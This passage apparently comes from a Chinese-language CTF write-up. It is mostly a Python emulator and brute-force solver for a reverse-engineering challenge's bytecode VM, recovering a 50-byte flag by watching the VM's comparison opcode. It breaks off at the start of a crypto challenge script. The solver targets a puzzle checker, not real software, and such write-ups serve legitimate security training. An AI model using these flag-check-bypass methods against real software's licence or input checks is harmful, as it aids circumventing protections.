class="line">    <span class="comment"># mem（输入），保证至少 0x40 长</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(mem) &lt; <span class="number">0x40</span>:</span><br><span class="line">    </span><br><span class="line">      mem = mem + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x40</span> - <span class="built_in">len</span>(mem))</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.mem = <span class="built_in">list</span>(mem)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># byte2（a2[2] 当作小量）确保存在</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.byte2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">current_op</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= <span class="variable language_">self</span>.pc &lt; <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">step</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行当前 pc 指令并推进。返回 (halted:bool, message:str|None).&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.pc &lt; <span class="number">0</span> <span class="keyword">or</span> <span class="variable language_">self</span>.pc &gt;= <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">f&quot;PC out of range <span class="subst">&#123;self.pc&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    v9 = <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 以下行为对应你反汇编中的分支</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">34</span>: <span class="comment"># add reg3</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc + (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">35</span>: <span class="comment"># sub</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc - (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">36</span>: <span class="comment"># mul</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc * (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">37</span>: <span class="comment"># div</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.reg3 == <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Error: Division by zero&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="built_in">int</span>(<span class="variable language_">self</span>.acc // <span class="variable language_">self</span>.reg3)</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">38</span>: <span class="comment"># xor</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc ^ (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">39</span>: <span class="comment"># push</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.sp &gt;= <span class="number">500</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Error: Stack overflow&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.stack.append(<span class="variable language_">self</span>.acc &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.sp += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">40</span>: <span class="comment"># pop</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.sp &lt;= <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Error: Stack underflow&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.sp -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.stack.pop() &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">41</span>: <span class="comment"># load mem[idx] -&gt; acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.idx &gt;= <span class="number">0x33</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.acc = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= <span class="variable language_">self</span>.idx &lt; <span class="built_in">len</span>(<span class="variable language_">self</span>.mem):</span><br><span class="line">    </span><br><span class="line">          <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.mem[<span class="variable language_">self</span>.idx]</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">          <span class="variable language_">self</span>.acc = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">42</span>: <span class="comment"># acc = reg3</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">43</span>: <span class="comment"># idx = acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.idx = <span class="variable language_">self</span>.acc &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">44</span>: <span class="comment"># a2[2] = acc (we map to byte2)</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.byte2 = <span class="variable language_">self</span>.acc &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">45</span>: <span class="comment"># reg3 = acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.reg3 = <span class="variable language_">self</span>.acc &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">46</span>: <span class="comment"># acc = code[pc+1]; pc += 2</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.pc + <span class="number">1</span> &gt;= <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Immediate out of range&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc + <span class="number">1</span>] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">47</span>: <span class="comment"># acc = idx</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.idx &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">48</span>: <span class="comment"># load cmp_data[idx] -&gt; acc (guard idx)</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.idx &gt;= <span class="number">0x32</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.errflag = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;HALT_IDX_GE_0x32&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="number">0</span> &lt;= <span class="variable language_">self</span>.idx &lt; <span class="built_in">len</span>(<span class="variable language_">self</span>.cmp_data):</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.acc = <span class="variable language_">self</span>.cmp_data[<span class="variable language_">self</span>.idx] &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.acc = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">49</span>: <span class="comment"># ++acc</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.acc = (<span class="variable language_">self</span>.acc + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">50</span>: <span class="comment"># loop: --byte2; if byte2 !=0 pc = pc - code[pc+1]; else pc+=2</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.byte2 = (<span class="variable language_">self</span>.byte2 - <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.byte2 != <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.pc + <span class="number">1</span> &gt;= <span class="built_in">len</span>(<span class="variable language_">self</span>.code):</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Immediate out of range for opcode 50&quot;</span></span><br><span class="line">    </span><br><span class="line">        imm = <span class="variable language_">self</span>.code[<span class="variable language_">self</span>.pc + <span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.pc = <span class="built_in">int</span>(<span class="variable language_">self</span>.pc - imm)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.pc += <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">51</span>: <span class="comment"># ++counter; if idx &gt;=0x32 -&gt; err; if !err &amp;&amp; acc!=reg3 err=1; idx--; pc++</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.counter += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.idx &gt;= <span class="number">0x32</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.errflag = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;HALT_IDX_GE_0x32_on_51&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">not</span> <span class="variable language_">self</span>.errflag) <span class="keyword">and</span> ((<span class="variable language_">self</span>.acc &amp; <span class="number">0xFFFFFFFF</span>) != (<span class="variable language_">self</span>.reg3 &amp; <span class="number">0xFFFFFFFF</span>)):</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.errflag = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="comment"># decrement idx</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.idx = (<span class="variable language_">self</span>.idx - <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">52</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="variable language_">self</span>.pc += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">255</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> <span class="variable language_">self</span>.errflag <span class="keyword">or</span> (<span class="variable language_">self</span>.counter != <span class="number">50</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Result: check failed (errflag or counter != 50)&quot;</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;oh!You are right!&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">f&quot;Unknown opcode: <span class="subst">&#123;v9&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解器：从 idx = 49 到 0 逐位枚举</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原理：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对每个目标索引 pos（49,48,...,0）：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  枚举 val=0..255，在一个 mem（长度至少 50）中把 mem[pos]=val，已知的 suffix (pos+1..49) 用上一步求得的字节填入，</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  其余字节置 0；执行 VM，监控每次遇到 opcode 51（比较）时的当前 vm.idx（比较发生时使用当前 idx 值），</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  当遇到 vm.idx == pos 的那次 51，就取当时的 vm.acc 和 vm.reg3（我们在执行该 51 前就可以读取），</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  如果 acc == reg3 那么这个 val 合格（接受）。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 该方法基于反汇编中比较是从高 idx 向低 idx 进行的（观察到的行为）。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line"></span><br><span class="line">  N = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">  found = [<span class="number">0</span>] * N <span class="comment"># 存放已恢复的字节；我们从高位向低位填充（49 -&gt; 0）</span></span><br><span class="line"></span><br><span class="line">  start_time = time.time()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>): <span class="comment"># 49,48,...,0</span></span><br><span class="line"></span><br><span class="line">    ok = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 求解 pos=<span class="subst">&#123;pos&#125;</span> ...&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># 构造 mem：所有字节默认 0；已知 suffix 填入；pos 处试 val</span></span><br><span class="line">    </span><br><span class="line">      mem = <span class="built_in">bytearray</span>(N)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pos+<span class="number">1</span>, N):</span><br><span class="line">    </span><br><span class="line">        mem[j] = found[j]</span><br><span class="line">    </span><br><span class="line">      mem[pos] = val</span><br><span class="line">    </span><br><span class="line">      <span class="comment"># run VM but we need to detect the 51 event for idx == pos</span></span><br><span class="line">    </span><br><span class="line">      vm = VM(code=CODE, cmp_data=CMP_DATA, mem=<span class="built_in">bytes</span>(mem))</span><br><span class="line">    </span><br><span class="line">      steps = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">      hit = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">      failure = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">        op = vm.current_op()</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> op <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    </span><br><span class="line">          failure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># If upcoming instruction is 51 and vm.idx == pos, check acc vs reg3 BEFORE executing step</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">51</span> <span class="keyword">and</span> vm.idx == pos:</span><br><span class="line">    </span><br><span class="line">          <span class="comment"># inspect acc &amp; reg3</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> (vm.acc &amp; <span class="number">0xFFFFFFFF</span>) == (vm.reg3 &amp; <span class="number">0xFFFFFFFF</span>):</span><br><span class="line">    </span><br><span class="line">            hit = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="comment"># execute the 51 step to keep VM consistent (not strictly necessary here)</span></span><br><span class="line">    </span><br><span class="line">          halted, msg = vm.step()</span><br><span class="line">    </span><br><span class="line">          <span class="keyword">if</span> halted:</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># if halted but it was a normal termination, still we can accept based on hit</span></span><br><span class="line">    </span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span> <span class="comment"># for this candidate we&#x27;ve evaluated the relevant comparison</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># otherwise just step normally until we either hit the event or VM halts or we step too many</span></span><br><span class="line">    </span><br><span class="line">        halted, msg = vm.step()</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> halted:</span><br><span class="line">    </span><br><span class="line">          failure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">        steps += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> steps &gt; <span class="number">200000</span>:</span><br><span class="line">    </span><br><span class="line">          failure = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> hit <span class="keyword">and</span> <span class="keyword">not</span> failure:</span><br><span class="line">    </span><br><span class="line">        found[pos] = val</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  -&gt; 找到 byte @ <span class="subst">&#123;pos&#125;</span> = 0x<span class="subst">&#123;val:02x&#125;</span> (&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(val) <span class="keyword">if</span> <span class="number">32</span>&lt;=val&lt;<span class="number">127</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span>&#125;</span>&#x27;)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">        ok = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&quot;!! 在 pos=<span class="subst">&#123;pos&#125;</span> 未找到匹配字节，停止。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  elapsed = time.time() - start_time</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;[+] 求解完成，耗时 <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>s&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(found)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证函数：把恢复到的 50 字节放回 VM，看返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">flag_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line"></span><br><span class="line">  vm = VM(code=CODE, cmp_data=CMP_DATA, mem=flag_bytes)</span><br><span class="line"></span><br><span class="line">  res = vm.run() <span class="keyword">if</span> <span class="built_in">hasattr</span>(vm, <span class="string">&quot;run&quot;</span>) <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># our VM class doesn&#x27;t have run wrapper; simulate here</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Re-run until halt</span></span><br><span class="line"></span><br><span class="line">  vm2 = VM(code=CODE, cmp_data=CMP_DATA, mem=flag_bytes)</span><br><span class="line"></span><br><span class="line">  steps = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    halted, msg = vm2.step()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> halted:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[*] VM final message:&quot;</span>, msg)</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[*] Final state: acc=&#123;&#125;, idx=&#123;&#125;, byte2=&#123;&#125;, sp=&#123;&#125;, pc=&#123;&#125;, reg3=&#123;&#125;, counter=&#123;&#125;, errflag=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    </span><br><span class="line">        vm2.acc, vm2.idx, <span class="built_in">getattr</span>(vm2, <span class="string">&quot;byte2&quot;</span>, <span class="number">0</span>), vm2.sp, vm2.pc, vm2.reg3, vm2.counter, vm2.errflag</span><br><span class="line">    </span><br><span class="line">      ))</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    steps += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> steps &gt; <span class="number">2000000</span>:</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[!] VM run exceeded step limit&quot;</span>)</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主流程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;开始自动求解 VM 输入（50 字节）...&quot;</span>)</span><br><span class="line"></span><br><span class="line">  flag_bytes = find_flag()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> flag_bytes <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;求解失败。&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;\n[+] 恢复到的原始输入（raw bytes）：&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(flag_bytes)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 尝试以可打印形式显示（若包含不可打印字符会以 repr 显示）</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    s = flag_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 以 utf-8 解码：&quot;</span>, s)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 以 utf-8 解码失败，显示 repr：&quot;</span>, <span class="built_in">repr</span>(flag_bytes))</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;\n[*] 用 VM 验证该输入：&quot;</span>)</span><br><span class="line"></span><br><span class="line">  verify(flag_bytes)</span><br></pre></td></tr></table></figure><p><img src="/2025/08/23/JGCTF-8-WP/image17.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Guillotine"><a href="#Guillotine" class="headerlink" title="Guillotine"></a>Guillotine</h2><p>这个本地直接就通了</p><p>但是打服务器老是超时</p><p>最终靠GPT5成功优化哈哈哈哈哈哈</p><p>直接丢脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 